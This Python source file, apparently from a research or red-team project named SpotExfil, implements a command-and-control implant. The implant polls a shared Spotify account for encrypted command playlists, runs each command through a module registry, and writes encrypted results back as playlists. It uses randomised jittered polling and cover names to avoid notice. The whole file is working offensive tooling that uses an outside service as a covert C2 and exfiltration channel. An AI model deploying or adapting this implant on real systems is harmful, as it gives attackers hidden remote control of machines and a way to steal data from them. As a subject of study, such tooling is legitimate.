"""implant.py - C2 implant that polls for commands and returns results.

Run-once, in-memory, foreground script. No persistence, no disk artifacts.
Polls the shared Spotify account for encrypted command playlists,
executes them, and writes encrypted results back.

Usage:
    python -m spotexfil.implant -k <encryption_key> [--interval 60] [--jitter 30]
"""

import argparse
import json
import random
import time
from pathlib import Path

from . import protocol as proto
from . import transport as spot
from .modules import get_module

__author__ = '@sourcefrenchy'
__email__ = 'jmamblat@icloud.com'
__status__ = 'PROTOTYPE'

# Load constants from shared protocol spec
_PROTO_PATH = Path(__file__).resolve().parent.parent.parent / 'shared' / 'protocol.json'
with open(_PROTO_PATH) as _f:
    _PROTO = json.load(_f)

# Maximum shell command execution time
SHELL_TIMEOUT = _PROTO['c2']['shell_timeout']

# Maximum result data size before truncation
MAX_RESULT_SIZE = _PROTO['c2']['max_result_size']


class Implant:
    """C2 implant: polls for commands, executes, returns results."""

    def __init__(self, spotify: spot.Spot, encryption_key: str,
                 interval: int = 60, jitter: int = 30):
        """Initialize the implant.

        Args:
            spotify: Authenticated Spot instance.
            encryption_key: Shared AES-256-GCM passphrase.
            interval: Base polling interval in seconds.
            jitter: Random jitter range (+/-) in seconds.
        """
        self.spotify = spotify
        self.key = encryption_key
        self.interval = interval
        self.jitter = jitter
        self.processed_seqs = set()

    def run(self):
        """Main polling loop. Runs until KeyboardInterrupt."""
        print("[*] Implant started, polling for commands...")
        try:
            while True:
                self._poll_and_execute()
                sleep_time = self.interval + random.randint(
                    -self.jitter, self.jitter
                )
                sleep_time = max(10, sleep_time)
                time.sleep(sleep_time)
        except KeyboardInterrupt:
            print("\n[*] Implant stopped")

    def _poll_and_execute(self):
        """Check for new commands, execute, return results."""
        try:
            seq_groups = self.spotify.read_c2_playlists(
                channel=proto.CHANNEL_CMD,
                encryption_key=self.key,
            )
        except Exception as err:
            print(f"[!] Poll error: {err}")
            return

        if not seq_groups:
            return

        for seq_num in sorted(seq_groups.keys()):
            if seq_num in self.processed_seqs:
                self.spotify.clean_c2_playlists(
                    proto.CHANNEL_CMD, self.key, seq=seq_num
                )
                continue

            chunk_metas = seq_groups[seq_num]
            try:
                payload = proto.reassemble_payload(chunk_metas)
                cmd_dict = proto.decode_message(payload, self.key)
                msg = proto.C2Message.from_command_dict(cmd_dict)
            except Exception as err:
                err_str = str(err).lower()
                if 'tag' in err_str or 'decrypt' in err_str or 'invalid' in err_str:
                    print(f"[!] Decryption failed for seq={seq_num}: "
                          f"encryption key mismatch with operator?")
                else:
                    print(f"[!] Failed to decode seq={seq_num}: {err}")
                self.spotify.clean_c2_playlists(
                    proto.CHANNEL_CMD, self.key, seq=seq_num
                )
                continue

            print(f"[*] Executing seq={seq_num} "
                  f"module={msg.module}")

            result = self._execute(msg)
            self._send_result(result)
            self.spotify.clean_c2_playlists(
                proto.CHANNEL_CMD, self.key, seq=seq_num
            )
            self.processed_seqs.add(seq_num)

    def _execute(self, msg: proto.C2Message) -> proto.C2Message:
        """Dispatch to the appropriate module handler.

        Uses the module registry for dispatch. Falls back to error
        for unknown modules.

        Args:
            msg: Command message to execute.

        Returns:
            Result message with execution output.
        """
        module_cls = get_module(msg.module)
        if not module_cls:
            return proto.C2Message(
                module=msg.module, seq=msg.seq,
                status="error",
                data=f"Unknown module: {msg.module}",
            )
        try:
            module_instance = module_cls()
            status, data = module_instance.execute(msg.args)
            return proto.C2Message(
                module=msg.module, seq=msg.seq,
                status=status, data=data,
            )
        except Exception as err:
            return proto.C2Message(
                module=msg.module, seq=msg.seq,
                status="error", data=str(err),
            )

    def _send_result(self, result: proto.C2Message):
        """Encode and write result to Spotify.

        Args:
            result: Result message to transmit.
        """
        try:
            encoded = proto.encode_message(
                result.to_result_dict(), self.key
            )
            chunks = proto.chunk_payload(
                encoded, result.seq, proto.CHANNEL_RES, self.key
            )
            self.spotify.write_c2_playlists(chunks)
            print(f"[*] Result sent for seq={result.seq}")
        except Exception as err:
            print(f"[!] Failed to send result seq={result.seq}: {err}")


def parse_args():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description='SpotExfil C2 Implant'
    )
    parser.add_argument(
        '-k', '--key', required=True,
        help='Encryption passphrase (must match operator)'
    )
    parser.add_argument(
        '--interval', type=int, default=60,
        help='Base polling interval in seconds (default: 60)'
    )
    parser.add_argument(
        '--jitter', type=int, default=30,
        help='Random jitter range +/- seconds (default: 30)'
    )
    return parser.parse_args()


def main():
    """Main entry point."""
    args = parse_args()
    spotify = spot.Spot(use_cover_names=True)
    implant = Implant(
        spotify, args.key,
        interval=args.interval, jitter=args.jitter,
    )
    implant.run()


if __name__ == "__main__":
    main()
